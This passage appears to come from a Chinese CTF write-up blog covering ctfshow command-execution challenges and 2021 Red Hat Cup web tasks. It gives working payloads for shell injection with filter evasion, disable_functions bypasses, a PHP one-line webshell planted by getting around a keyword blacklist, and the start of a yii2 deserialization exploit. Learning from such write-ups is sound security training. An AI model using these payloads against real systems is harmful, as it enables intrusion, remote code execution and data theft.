class="language-none">/?c=nl%09fla\g.php||/?c=nl%09fla\g.php%0a/?c=nl%09fla''g.php%0a/?c=nl%09fla""g.php%0a/?c=vi%09fla\g.php%0a/?c=tac%09fla\g.php%0a/?c=uniq%09fla\g.php%0a/?c=nl&lt;fla''g.php||/?c=nl%09fla\g.php%26<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="web50-51"><a href="#web50-51" class="headerlink" title="web50-51"></a>web50-51</h2><p>payload：</p><pre class="line-numbers language-none"><code class="language-none">/?c=nl&lt;fla%27%27g.php||<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="web52"><a href="#web52" class="headerlink" title="web52"></a>web52</h2><p>payload：</p><pre class="line-numbers language-none"><code class="language-none">/?c=nl${IFS}/fl""ag%0a<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="web53"><a href="#web53" class="headerlink" title="web53"></a>web53</h2><p>payload：</p><pre class="line-numbers language-none"><code class="language-none">/?c=nl${IFS}fla%''g.p''hp/?c=ca''t${IFS}fl??????/?c=ca''t${IFS}fl''ag.p''hp应该还有其他姿势<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h2 id="web54"><a href="#web54" class="headerlink" title="web54"></a>web54</h2><p>payload：</p><pre class="line-numbers language-none"><code class="language-none">/?c=mv${IFS}fla?.php${IFS}t.tx''t爷给他改个名/?c=/bin/?at${IFS}f???????<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h2 id="web55"><a href="#web55" class="headerlink" title="web55"></a>web55</h2><p>= = 只能是数字</p><p>对不起骚套路开始</p><p>payload：</p><pre class="line-numbers language-none"><code class="language-none">/?c=/???/????64+????.???<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="web56"><a href="#web56" class="headerlink" title="web56"></a>web56</h2><blockquote><p><a href="https://blog.csdn.net/qq_46091464/article/details/108513145">https://blog.csdn.net/qq_46091464/article/details/108513145</a></p></blockquote><p>数据包：</p><pre class="line-numbers language-none"><code class="language-none">POST /?c=.+/???/????????[@-[] HTTP/1.1Host: 6595d4e2-edc5-4ff4-a08b-c93d2f563732.challenge.ctf.show:8080Content-Length: 329Cache-Control: max-age=0Upgrade-Insecure-Requests: 1Origin: nullContent-Type: multipart/form-data; boundary=----WebKitFormBoundarydZeuVbMPZVcyvpNMUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9Connection: close------WebKitFormBoundarydZeuVbMPZVcyvpNMContent-Disposition: form-data; name="file"; filename="2.php"Content-Type: application/octet-stream#!/bin/shcat /var/www/html/flag.php------WebKitFormBoundarydZeuVbMPZVcyvpNMContent-Disposition: form-data; name="submit"111------WebKitFormBoundarydZeuVbMPZVcyvpNM--<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>##web58</p><p>凑36</p><p>-37取反=36</p><p>payload：</p><pre class="line-numbers language-none"><code class="language-none">$((~$(($((~$((${_}))))$((~$((${_}))))$((~$((${_}))))$((~$((${_}))))$((~$((${_}))))$((~$((${_}))))$((~$((${_}))))$((~$((${_}))))$((~$((${_}))))$((~$((${_}))))$((~$((${_}))))$((~$((${_}))))$((~$((${_}))))$((~$((${_}))))$((~$((${_}))))$((~$((${_}))))$((~$((${_}))))$((~$((${_}))))$((~$((${_}))))$((~$((${_}))))$((~$((${_}))))$((~$((${_}))))$((~$((${_}))))$((~$((${_}))))$((~$((${_}))))$((~$((${_}))))$((~$((${_}))))$((~$((${_}))))$((~$((${_}))))$((~$((${_}))))$((~$((${_}))))$((~$((${_}))))$((~$((${_}))))$((~$((${_}))))$((~$((${_}))))$((~$((${_}))))$((~$((${_}))))))))<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>##web59</p><p>绕过disable_functions</p><p>我只想到一种</p><p><code>file</code>可以把文件读取到一个数组，再打印出来</p><p>payload：</p><pre class="line-numbers language-none"><code class="language-none">c=var_dump(file('flag.php'));c=highlight_file("flag.php");c=show_source('flag.php');<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>##web60-65</p><p>payload：</p><pre class="line-numbers language-none"><code class="language-none">c=highlight_file("flag.php");c=show_source('flag.php');<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h2 id="web66"><a href="#web66" class="headerlink" title="web66"></a>web66</h2><p>payload：</p><pre class="line-numbers language-none"><code class="language-none">c=var_dump(scandir("/"));扫描到flag 是txt然后日他妈的c=highlight_file('/flag.txt');<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h2 id="web67-70"><a href="#web67-70" class="headerlink" title="web67-70"></a>web67-70</h2><p>= = 好家伙</p><p>ban的真多</p><p>payload：</p><pre class="line-numbers language-none"><code class="language-none">c=include('/flag.txt');c=require('/flag.txt');c=require_once('/flag.txt');<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h2 id="web71"><a href="#web71" class="headerlink" title="web71"></a>web71</h2><p><code>ob_get_contents — 返回输出缓冲区的内容 ob_end_clean — 清空（擦除）缓冲区并关闭输出缓冲</code></p><p>此函数丢弃最顶层输出缓冲区的内容并关闭这个缓冲区。如果想要进一步处理缓冲区的内容，必须在<strong>ob_end_clean()**之前调用<a href="function.ob-get-contents.html">ob_get_contents()</a>，因为当调用</strong>ob_end_clean()**时缓冲区内容将被丢弃。</p><blockquote><p><a href="https://blog.csdn.net/solitudi/article/details/109837640?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522163062881716780269897928%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&amp;request_id=163062881716780269897928&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-1-109837640.first_rank_v2_pc_rank_v29&amp;utm_term=y4tacker+%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C&amp;spm=1018.2226.3001.4187">https://blog.csdn.net/solitudi/article/details/109837640?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522163062881716780269897928%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&amp;request_id=163062881716780269897928&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-1-109837640.first_rank_v2_pc_rank_v29&amp;utm_term=y4tacker+%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C&amp;spm=1018.2226.3001.4187</a> y4的blog说的很清楚</p></blockquote><p>payload：</p><pre class="line-numbers language-none"><code class="language-none">c=include('/flag.txt');;exit();<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="web72"><a href="#web72" class="headerlink" title="web72"></a>web72</h2><blockquote><p>看一下y4的blog就可以了= = payload不贴了 太长了。</p></blockquote><p>##web73</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">c=?&gt;<span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token variable">$a</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">DirectoryIterator</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"glob:///*"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$a</span> <span class="token keyword">as</span> <span class="token variable">$f</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">echo</span><span class="token punctuation">(</span><span class="token variable">$f</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token single-quoted-string string">' '</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>看一下目录</p><p>然后</p><p>payload：</p><pre class="line-numbers language-none"><code class="language-none">c=include('/flagc.txt');exit();<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="web74"><a href="#web74" class="headerlink" title="web74"></a>web74</h2><p>同73题</p><h2 id="web75-76"><a href="#web75-76" class="headerlink" title="web75-76"></a>web75-76</h2><p>扫目录</p><pre class="line-numbers language-none"><code class="language-none">c=$a=new DirectoryIterator("glob:///*");foreach($a as $f){echo($f-&gt;__toString().' ');}exit(0);<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>mysql load_file读文件</p><pre class="line-numbers language-none"><code class="language-none">c=try {$dbh = new PDO('mysql:host=localhost;dbname=ctftraining', 'root','root');foreach($dbh-&gt;query('select load_file("/flag36.txt")') as $row){echo($row[0])."|"; }$dbh = null;}catch (PDOException $e) {echo $e-&gt;getMessage();exit(0);}exit(0);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>##web77</p><p>不是很清楚这个题怎么做</p><p>但是我复现了一下</p><blockquote><p><a href="https://www.laruence.com/2020/03/11/5475.html">https://www.laruence.com/2020/03/11/5475.html</a></p><p><a href="https://blog.csdn.net/miuzzx/article/details/108619930">https://blog.csdn.net/miuzzx/article/details/108619930</a></p></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla</summary>
      
    
    
    
    <category term="wp" scheme="http://h3geeker.top/categories/wp/"/>
    
    
    <category term="做题记录" scheme="http://h3geeker.top/tags/%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/"/>
    
  </entry>
  
  <entry>
    <title>CTFHub 2021-第四届红帽杯网络安全大赛-Web-find_it</title>
    <link href="http://h3geeker.top/posts/ce4e97fc.html"/>
    <id>http://h3geeker.top/posts/ce4e97fc.html</id>
    <published>2021-11-11T03:35:22.000Z</published>
    <updated>2021-11-11T03:48:47.990Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="CTFHub-2021-第四届红帽杯网络安全大赛-Web-find-it"><a href="#CTFHub-2021-第四届红帽杯网络安全大赛-Web-find-it" class="headerlink" title="[CTFHub] 2021-第四届红帽杯网络安全大赛-Web-find_it"></a>[CTFHub] 2021-第四届红帽杯网络安全大赛-Web-find_it</h1><p>看群里说CTFHub上复现了， 我来看看</p><p>本来想按照红帽杯的套路来试一下，发现phpinfo里莫得flag了</p><p><img src="https://i.loli.net/2021/05/12/VefYUiBcQvhkTIo.png"></p><p>只能想想其他办法咯</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token shell-comment comment">#Really easy...</span><span class="token variable">$file</span><span class="token operator">=</span><span class="token function">fopen</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"flag.php"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"r"</span><span class="token punctuation">)</span> <span class="token keyword">or</span> <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"Unable 2 open!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$I_know_you_wanna_but_i_will_not_give_you_hhh</span> <span class="token operator">=</span> <span class="token function">fread</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">,</span><span class="token function">filesize</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"flag.php"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$hack</span><span class="token operator">=</span><span class="token function">fopen</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"hack.php"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"w"</span><span class="token punctuation">)</span> <span class="token keyword">or</span> <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"Unable 2 open"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'code'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'/system|eval|exec|base|compress|chr|ord|str|replace|pack|assert|preg|replace|create|function|call|\~|\^|\`|flag|cat|tac|more|tail|echo|require|include|proc|open|read|shell|file|put|get|contents|dir|link|dl|var|dump/'</span><span class="token punctuation">,</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">die</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"you die"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token operator">&gt;</span><span class="token number">33</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">die</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"nonono."</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token function">fwrite</span><span class="token punctuation">(</span><span class="token variable">$hack</span><span class="token punctuation">,</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">fwrite</span><span class="token punctuation">(</span><span class="token variable">$hack</span><span class="token punctuation">,</span><span class="token variable">$I_know_you_wanna_but_i_will_not_give_you_hhh</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">fclose</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">fclose</span><span class="token punctuation">(</span><span class="token variable">$hack</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>preg_match()</code>过滤了<code>eval</code>但是！！！！！</p><p><code>Eval</code>它没ban</p><p>所以我们可以写’大’马</p><p>构造payload：</p><pre class="line-numbers language-none"><code class="language-none">/?code=&lt;?php%20@Eval($_POST['aaa']);?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>蚁剑连马</p><p>拿到flag：</p><p><img src="https://i.loli.net/2021/05/12/D89pgxfsbSlhZTz.png"></p><p>但是作为菜鸡</p><p>我还是要重新思考一下这道题的思路：</p><p>代码中有几个函数需要注意一下</p><p>比如<code>fopen()</code>,<code>fwrite()</code>,<code>fread()</code></p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token function">fread</span><span class="token punctuation">(</span><span class="token punctuation">)</span> 函数读取文件<span class="token variable">$I_know_you_wanna_but_i_will_not_give_you_hhh</span> <span class="token operator">=</span> <span class="token function">fread</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">,</span><span class="token function">filesize</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"flag.php"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>也就是说，这里已经读到了flag</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$a</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'code'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token function">fwrite</span><span class="token punctuation">(</span><span class="token variable">$hack</span><span class="token punctuation">,</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">fwrite</span><span class="token punctuation">(</span><span class="token variable">$hack</span><span class="token punctuation">,</span><span class="token variable">$I_know_you_wanna_but_i_will_not_give_you_hhh</span><span class="token punctuation">)</span><span class="token punctuation">;</span>这里又都写到了hack<span class="token punctuation">.</span>php<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>所以也就是说，我们再绕通配符写马的时候，flag也被传进了hack.php中</p><p>但是为什么看不到呢（具体我也不知道，知道的大哥哥可以告诉我学习一下）</p><p>但是我想到了另外一个函数<code>show_source()</code></p><pre class="line-numbers language-none"><code class="language-none">show_source() 函数对文件进行语法高亮显示。<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>随机构造payload：</p><pre class="line-numbers language-none"><code class="language-none">/?code=&lt;?php show_source(__FILE__);?&gt;也没有被ban的项，正常传入<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>然后访问<code>hack.php</code></p><p>flag他就出来了。。。。</p><p>同时还有我传入的payload</p><p><img src="https://i.loli.net/2021/05/12/rFVdyT7eBqtgnxb.png"></p><p>搞一波骚操作！</p><p><img src="https://i.loli.net/2021/05/12/Z3TzmtK8y4U6ehj.png"></p><p>所以，今天又学到了新姿势~~~~</p>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla</summary>
      
    
    
    
    <category term="wp" scheme="http://h3geeker.top/categories/wp/"/>
    
    
    <category term="做题记录" scheme="http://h3geeker.top/tags/%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/"/>
    
  </entry>
  
  <entry>
    <title>2021红帽杯 web writeup</title>
    <link href="http://h3geeker.top/posts/fa671b36.html"/>
    <id>http://h3geeker.top/posts/fa671b36.html</id>
    <published>2021-11-11T03:35:22.000Z</published>
    <updated>2021-11-11T03:48:32.298Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="find-it"><a href="#find-it" class="headerlink" title="find_it"></a>find_it</h1><p>老套路扫一下目录</p><p><img src="https://i.loli.net/2021/05/09/4EKaizG6qguQYn1.png"></p><p>貌似只有君子协定有用，打开看看</p><pre class="line-numbers language-none"><code class="language-none">When I was a child,I also like to read Robots.txtHere is what you want:1ndexx.php<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>打开1ndexx.php 发现打不开，</p><p><img src="https://i.loli.net/2021/05/09/nTgAyYj2vQON4Fr.png"></p><p>尝试一下是否有备份</p><pre class="line-numbers language-none"><code class="language-none">/.1ndexx.php.swp<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>发现了一串代码：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token variable">$link</span> <span class="token operator">=</span> <span class="token function">mysql_connect</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'localhost'</span><span class="token punctuation">,</span> <span class="token single-quoted-string string">'root'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token delimiter important">?&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">&gt;</span></span>Hello worldd!<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>style</span><span class="token punctuation">&gt;</span></span><span class="token style"><span class="token language-css"><span class="token selector">body</span> <span class="token punctuation">{</span><span class="token property">background-color</span><span class="token punctuation">:</span> white<span class="token punctuation">;</span><span class="token property">text-align</span><span class="token punctuation">:</span> center<span class="token punctuation">;</span><span class="token property">padding</span><span class="token punctuation">:</span> 50px<span class="token punctuation">;</span><span class="token property">font-family</span><span class="token punctuation">:</span> <span class="token string">"Open Sans"</span><span class="token punctuation">,</span><span class="token string">"Helvetica Neue"</span><span class="token punctuation">,</span>Helvetica<span class="token punctuation">,</span>Arial<span class="token punctuation">,</span>sans-serif<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token selector">#logo</span> <span class="token punctuation">{</span><span class="token property">margin-bottom</span><span class="token punctuation">:</span> 40px<span class="token punctuation">;</span><span class="token punctuation">}</span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>style</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>logo<span class="token punctuation">"</span></span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>logo.png<span class="token punctuation">"</span></span> <span class="token punctuation">/&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h1</span><span class="token punctuation">&gt;</span></span><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token keyword">echo</span> <span class="token double-quoted-string string">"Hello My freind!"</span><span class="token punctuation">;</span> <span class="token delimiter important">?&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h1</span><span class="token punctuation">&gt;</span></span><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$link</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token delimiter important">?&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h2</span><span class="token punctuation">&gt;</span></span>I Can't view my php files?!<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h2</span><span class="token punctuation">&gt;</span></span><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span> <span class="token delimiter important">?&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h2</span><span class="token punctuation">&gt;</span></span>MySQL Server version: <span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token keyword">echo</span> <span class="token function">mysql_get_server_info</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token delimiter important">?&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h2</span><span class="token punctuation">&gt;</span></span><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token punctuation">}</span> <span class="token delimiter important">?&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">&gt;</span></span><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token shell-comment comment">#Really easy...</span><span class="token variable">$file</span><span class="token operator">=</span><span class="token function">fopen</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"flag.php"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"r"</span><span class="token punctuation">)</span> <span class="token keyword">or</span> <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"Unable 2 open!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$I_know_you_wanna_but_i_will_not_give_you_hhh</span> <span class="token operator">=</span> <span class="token function">fread</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">,</span><span class="token function">filesize</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"flag.php"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$hack</span><span class="token operator">=</span><span class="token function">fopen</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"hack.php"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"w"</span><span class="token punctuation">)</span> <span class="token keyword">or</span> <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"Unable 2 open"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'code'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'/system|eval|exec|base|compress|chr|ord|str|replace|pack|assert|preg|replace|create|function|call|\~|\^|\`|flag|cat|tac|more|tail|echo|require|include|proc|open|read|shell|file|put|get|contents|dir|link|dl|var|dump/'</span><span class="token punctuation">,</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">die</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"you die"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token operator">&gt;</span><span class="token number">33</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">die</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"nonono."</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token function">fwrite</span><span class="token punctuation">(</span><span class="token variable">$hack</span><span class="token punctuation">,</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">fwrite</span><span class="token punctuation">(</span><span class="token variable">$hack</span><span class="token punctuation">,</span><span class="token variable">$I_know_you_wanna_but_i_will_not_give_you_hhh</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">fclose</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">fclose</span><span class="token punctuation">(</span><span class="token variable">$hack</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>构造payload：</p><pre class="line-numbers language-none"><code class="language-none">/?code=&lt;?php%20phpinfo();?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>然后访问一下hack.php查看phpinfo</p><p>本来只是想指向探针看一下，没想到flag直接给了</p><p><img src="https://i.loli.net/2021/05/09/ny7PlqVYvoRCZUI.png"></p><h1 id="framework"><a href="#framework" class="headerlink" title="framework"></a>framework</h1><p>打开发现是<code>yii2反序列化</code></p><p>随即打开百度，来找一下复现：</p><blockquote><p><a href="https://mp.weixin.qq.com/s?__biz=MzU5MDI0ODI5MQ==&amp;mid=2247485129&amp;idx=1&amp;sn=b27e3fe845daee2fb13bb9f36f53ab40">https://mp.weixin.qq.com/s?__biz=MzU5MDI0ODI5MQ==&amp;mid=2247485129&amp;idx=1&amp;sn=b27e3fe845daee2fb13bb9f36f53ab40</a></p></blockquote><p>然后回到题目，按照常理我扫了一下网站目录，发现了<code>www.zip</code>“ ：</p><p><img src="https://i.loli.net/2021/05/09/AWP7rC6RewKDsky.png"></p><p>下载到本地发现正好是源码，就在本地搭建环境</p><p>丢进去phpstudy里，按照大佬的漏洞复现，在controllers下创建<code>Controller.php</code></p><p><img src="https://i.loli.net/2021/05/09/MVcW7PqKdzaOIw4.png"></p><p>然后再新建个<code>poc.php</code></p><p>在里面写：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">namespace</span> <span class="token package">yii<span class="token punctuation">\</span>rest</span><span class="token punctuation">{</span>    <span class="token keyword">class</span> <span class="token class-name">CreateAction</span><span class="token punctuation">{</span>        <span class="token keyword">public</span> <span class="token variable">$checkAccess</span><span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token variable">$id</span><span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span 